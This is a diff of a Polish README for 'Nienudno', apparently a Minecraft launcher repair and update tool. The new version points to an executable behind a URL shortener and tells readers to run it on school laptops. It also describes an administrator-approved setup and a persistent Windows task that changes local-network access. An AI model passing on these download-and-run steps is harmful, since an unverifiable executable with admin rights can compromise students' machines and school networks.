@@ -1,7 +1,11 @@
-# Nienudno — naprawa aktualizacji internetowych
+# Nienudno — naprawa i aktualizacja
 
-Pobierz [Napraw-aktualizacje.exe](https://raw.githubusercontent.com/Ennant/nienudno-updates/main/repair944plus/Napraw-aktualizacje.exe) i otwórz pobrany plik na laptopie z zainstalowanym Nienudno. Nie wymaga konta, logowania ani pendrive'a. Przed uruchomieniem zapisz grę i zamknij Minecraft.
+Pobierz `Napraw-aktualizacje.exe` przez https://da.gd/nnd948 i uruchom na szkolnym laptopie.
 
-Jednorazowa migracja obsługuje oryginalne wydania 9.4.4, 9.4.6, 9.4.7 i 9.4.8 oraz sprawdza połączenie w 9.4.8-online1. Pobiera około 102 MB; czas instalacji zależy od internetu i dysku. Zachowuje światy oraz ustawienia. Późniejsze aktualizacje uruchamiaj przyciskiem „Aktualizuj” w launcherze.
+Narzędzie sprawdza podpis aktualizacji, naprawia stały skrót do aktualnego launchera oraz zachowuje światy i inne pliki pulpitu. Stare skróty należące do launchera przenosi do odzyskiwalnego archiwum instalacji. Zapewnia skrót „Zmień tapetę”.
 
-Windows lub przeglądarka mogą wyświetlić potwierdzenie przed uruchomieniem pliku. Program nie zmienia zabezpieczeń Windows.
+Przy pierwszym przygotowaniu wspólnej sieci Windows wymaga zgody administratora. Kolejne podpisane wydania korzystają z chronionego zadania Windows do odświeżania ograniczonego dostępu w lokalnej podsieci. Zapora pozostaje włączona. Zasady administratora nie są obchodzone.
+
+Zapisz i zamknij Minecraft przed zastosowaniem aktualizacji. Jeśli pliki są już pobrane, launcher oferuje przycisk „Uruchom najnowszą wersję”.
+
+Ta aktualizacja wymaga istniejącej pełnej instalacji Nienudno. Starszy oryginalny instalator zachowano jako `Napraw-aktualizacje-legacy-r10.exe`. Nie jest to deklaracja zgodności różnych wersji protokołu Minecraft ze wspólnym światem.
